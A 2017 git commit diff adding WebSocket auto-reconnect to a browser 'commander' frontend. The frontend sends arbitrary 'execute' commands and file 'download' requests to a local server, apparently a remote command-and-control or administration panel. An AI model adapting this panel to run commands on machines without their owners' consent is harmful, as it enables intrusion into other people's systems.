98a9348d94bcb07d5e09297e28d53ad753a8e908
Daen Rebel <daenrebel035@gmail.com>
2017-11-27 16:07:42 +0100

    Added reconnect for the frontend to the server

--- Frontend/index.js
+++ Frontend/index.js
@@ -1,98 +1,122 @@
 var connection;
 window.addEventListener("load", function () {
-    // Define the connection
-    connection = new WebSocket("ws://localhost:8999");
 
-    // Open the connection
-    connection.onopen = function () {
-        // Send random string as ID
-        var data = {};
-        data.client = {};
-        data.client.id = makeid();
-        data.client.type = "commander";
-        // Send the INIT data
-        connection.send((JSON.stringify(data)));
+    // make a unique number for the session
+    var sessionId = makeuuid();
 
-        // Get the form
-        document.getElementById("form").onsubmit = function (event) {
-            // Get the message element
-            var msg = document.getElementById("msg");
-            var cmd = document.getElementById("cmd");
+    // initClient function
+    function initClient() {
+        // Define the connection
+        connection = new WebSocket("ws://localhost:8999");
 
-            // Check if message has value
-            if (msg.value) {
-                // Make the data
-                var data = {};
-                data.type = "message";
-                data.message = msg.value;
+        // Open the connection
+        connection.onopen = function () {
+            // Send random string as ID
+            var data = {};
+            data.client = {};
+            data.client.id = sessionId;
+            data.client.type = "commander";
+            // Send the INIT data
+            connection.send((JSON.stringify(data)));
 
-                // Send the MESSAGE data
-                connection.send((JSON.stringify(data)));
-            }
+            // Get the form
+            document.getElementById("form").onsubmit = function (event) {
+                // Get the message element
+                var msg = document.getElementById("msg");
+                var cmd = document.getElementById("cmd");
 
-            if (cmd.value) {
-                // Make the data
-                var data = {};
-                data.type = "execute";
-                data.command = cmd.value;
+                // Check if message has value
+                if (msg.value) {
+                    // Make the data
+                    var data = {};
+                    data.type = "message";
+                    data.message = msg.value;
 
-                // Send the MESSAGE data
-                connection.send((JSON.stringify(data)));
-            }
-            // Unset the message field
-            cmd.value = "";
-            msg.value = "";
-            event.preventDefault();
-        }
+                    // Send the MESSAGE data
+                    connection.send((JSON.stringify(data)));
+                }
 
-        // Get the form
-        document.getElementById("downloadform").onsubmit = function (event) {
-            // Get the message element
-            var dld = document.getElementById("dld");
-            var sav = document.getElementById("sav");
+                if (cmd.value) {
+                    // Make the data
+                    var data = {};
+                    data.type = "execute";
+                    data.command = cmd.value;
 
-            if (dld.value && sav.value) {
-                // Make the data
-                var data = {};
-                data.type = "download";
-                data.command = dld.value;
-                data.savename = sav.value;
+                    // Send the MESSAGE data
+                    connection.send((JSON.stringify(data)));
+                }
+                // Unset the message field
+                cmd.value = "";
+                msg.value = "";
+                event.preventDefault();
+            };
 
-                // Send the MESSAGE data
-                connection.send((JSON.stringify(data)));
-            }
-            // Unset the message field
-            cmd.value = "";
-            msg.value = "";
-            event.preventDefault();
-        }
-    };
+            // Get the form
+            document.getElementById("downloadform").onsubmit = function (event) {
+                // Get the message element
+                var dld = document.getElementById("dld");
+                var sav = document.getElementById("sav");
 
-    // EVENT on close
-    connection.onclose = function () {
-        console.log("Connection closed");
-    };
+                if (dld.value && sav.value) {
+                    // Make the data
+                    var data = {};
+                    data.type = "download";
+                    data.command = dld.value;
+                    data.savename = sav.value;
 
-    // EVENT on error
-    connection.onerror = function () {
-        console.error("Connection error");
-    };
+                    // Send the MESSAGE data
+                    connection.send((JSON.stringify(data)));
+                }
+                // Unset the message field
+                cmd.value = "";
+                msg.value = "";
+                event.preventDefault();
+            };
+        };
 
-    // EVENT on message
-    connection.onmessage = function (event) {
-        var div = document.createElement("div");
-        div.textContent = event.data;
-        document.body.appendChild(div);
+
+        // EVENT on close
+        connection.onclose = function () {
+            console.log("Connection closed");
+        };
+
+        // EVENT on error
+        connection.onerror = function () {
+            console.error("Connection error");
+        };
+
+        // EVENT on message
+        connection.onmessage = function (event) {
+            var div = document.createElement("div");
+            div.textContent = event.data;
+            document.body.appendChild(div);
+        };
     }
+
+    // pulseCheck just tries to connect every 5 seconds
+    function pulseCheck() {
+        // If there is no connection and the websocket ReadyState seems closed, run initClient(); again
+        if (!connection || connection.readyState === WebSocket.CLOSED) {
+            // Init the client
+            initClient();
+        }
+    }
+
+    // initialize the client
+    initClient();
+
+    // Check if the connection is live every 5 seconds
+    setInterval(pulseCheck, 5000);
+
+
 });
 
-
 // Random ID function
-function makeid() {
+function makeuuid() {
     var text = "";
     var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
 
-    for (var i = 0; i < 5; i++)
+    for (var i = 0; i < 8; i++)
         text += possible.charAt(Math.floor(Math.random() * possible.length));
 
     return text;
